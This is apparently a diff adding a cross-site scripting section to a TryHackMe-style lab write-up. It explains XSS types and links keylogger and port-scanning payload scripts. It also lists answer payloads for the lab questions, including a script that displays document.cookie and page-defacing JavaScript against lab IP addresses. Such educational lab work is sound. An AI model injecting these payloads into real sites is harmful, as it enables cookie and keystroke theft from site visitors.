@@ -138,3 +138,50 @@ IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfigu
 
 Flag: [http://10.10.181.221/note.php?note=0](http://10.10.181.221/note.php?note=0)
 
+## **Day 5 –** Cross-site Scripting \(XSS\)
+
+Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection that can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.
+
+A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in JavaScript, VBScript, Flash, and CSS. There are three main types of cross-site scripting:
+
+#### XSS Payloads
+
+Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious JavaScript on a victim’s machine. Check out some common payloads types used:
+
+* Popup's \(`alert(&#x201C;Hello World&#x201D;)`\) - Creates a Hello World message popup on a users browser. Writing HTML \(`document.write`\) - Override the website's HTML to add your own \(essentially defacing the entire page\). 
+* XSS Keylogger \([http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)\) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage. 
+* Port scanning \([http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)\) - A mini local port scanner \(more information on this is covered in the TryHackMe XSS room\). 
+* XSS-Payloads.com \([http://www.xss-payloads.com/](http://www.xss-payloads.com/)\) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.
+
+
+
+#### _\#2 Go to_ [_http://10.10.197.117/reflected_](http://10.10.197.117/reflected) _and craft a reflected XSS payload that will cause a popup saying "Hello"._
+
+Payload: `<script>alert("Hello")</script>`
+
+#### _\#3 On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address._
+
+Payload: `alert(window.location.hostname)`
+
+#### _\#4 Now navigate to_ [_http://10.10.197.117/stored_](http://10.10.197.117/stored) _and make an account. Then add a comment and see if you can insert some of your own HTML._
+
+Payload: `document.querySelector('code').textContent =thanks`
+
+#### _\#5 On the same page, create an alert popup box appear on the page with your document cookies._
+
+Payload: `<script>alert(document.cookie)</script>`
+
+#### _\#6 Change "XSS Playground" to "I am a hacker" by adding a comment and using JavaScript._
+
+Payload: `document.querySelector('#thm-title').textContent = 'I am a hacker'`
+
+
+
+
+
+
+
+
+
+
+
